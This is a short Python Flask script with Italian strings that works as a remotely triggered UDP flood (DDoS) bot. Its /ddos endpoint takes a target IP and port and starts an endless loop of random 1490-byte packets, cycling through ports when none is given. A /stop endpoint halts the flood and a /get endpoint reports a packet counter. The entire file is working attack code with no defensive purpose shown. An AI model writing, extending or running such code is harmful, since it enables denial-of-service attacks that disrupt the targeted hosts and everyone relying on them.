from threading import Thread

from flask import Flask, request
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
app = Flask(__name__)
canAdd = True
sent = 0
port = 1
servername = input("nome server:")
def processo(ip4, port2):
    global  canAdd, sent, bytes,port
    canAdd = True
    if canAdd:
        ip =ip4
        if not port2:
            while canAdd:
                sock.sendto(bytes, (ip, port))
                sent = sent + 1
                port = port + 1
                if sent > 900000:
                    sent = 0
                if port == 65534:
                    port = 1
        else:
            port = int(port2)
            while canAdd:
                sock.sendto(bytes, (ip, port))
                sent = sent + 1
                if sent > 900000:
                    sent = 0
@app.route("/ddos",methods=['GET', 'POST'])
def main():
    a = Thread(target = processo, args=( request.args.get("ip"), request.args.get("port")))
    a.start()
    a.join()

    return "ddos avviato"




@app.route("/get", methods=['GET', 'POST'])
def main2():
    global sent
    return "pacchetti in carico : " +str(sent)
@app.route("/stop", methods=['GET', 'POST'])
def main3():
    global canAdd, sent, servername
    canAdd = False
    sent = 0
    return "stop eseguito correttamente su server :" + servername
@app.route("/")
def mainwe():
    return "main"
if __name__ == "__main__":
    app.run( host="0.0.0.0" ,port='5000')
